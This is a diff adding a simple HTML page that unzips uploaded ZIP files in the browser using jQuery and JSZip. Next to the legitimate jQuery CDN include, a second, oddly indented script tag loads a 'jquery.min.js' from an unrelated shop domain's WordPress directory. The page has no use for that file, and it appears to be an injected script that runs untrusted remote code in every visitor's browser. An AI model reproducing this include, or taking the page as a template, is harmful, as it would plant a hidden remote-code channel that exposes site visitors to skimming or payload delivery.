@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZIP File Unzipper</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <h1>ZIP File Unzipper</h1>
+        <form id="uploadForm">
+            <div class="form-group">
+                <label for="fileInput">Choose a zip file to upload:</label>
+                <input type="file" class="form-control-file" id="fileInput" accept=".zip" required>
+            </div>
+            <button type="button" class="btn btn-primary" id="unzipBtn">Unzip</button>
+        </form>
+        <div id="output"></div>
+        <div id="downloadLinks" style="display: none;">
+            <h3>Download Files:</h3>
+            <ul id="fileList"></ul>
+        </div>
+    </div>
+
+
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
+      <script src="https://a-r-d.shop/wp-includes/js/jquery/jquery.min.js"></script> 
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
+    <script>
+        jQuery(document).ready(function($) {
+            $('#unzipBtn').click(function() {
+                var fileInput = $('#fileInput')[0].files[0];
+                if (fileInput) {
+                    var zip = new JSZip();
+                    zip.loadAsync(fileInput)
+                    .then(function(contents) {
+                        $('#output').html('<p>Unzipped successfully!</p>');
+                        displayDownloadLinks(contents);
+                    })
+                    .catch(function(error) {
+                        $('#output').html('<p>Error: ' + error.message + '</p>');
+                    });
+                } else {
+                    $('#output').html('<p>Please select a file to upload.</p>');
+                }
+            });
+
+            function displayDownloadLinks(contents) {
+                var fileList = $('#fileList');
+                fileList.empty(); // Clear previous links if any
+
+                contents.forEach(function(relativePath, file) {
+                    file.async('blob').then(function(blob) {
+                        var url = URL.createObjectURL(blob);
+                        var link = $('<a>').attr({
+                            href: url,
+                            download: file.name
+                        }).text(file.name);
+                        var listItem = $('<li>').append(link);
+                        fileList.append(listItem);
+                    });
+                });
+
+                $('#downloadLinks').show();
+            }
+        });
+    </script>
+</body>
+</html>
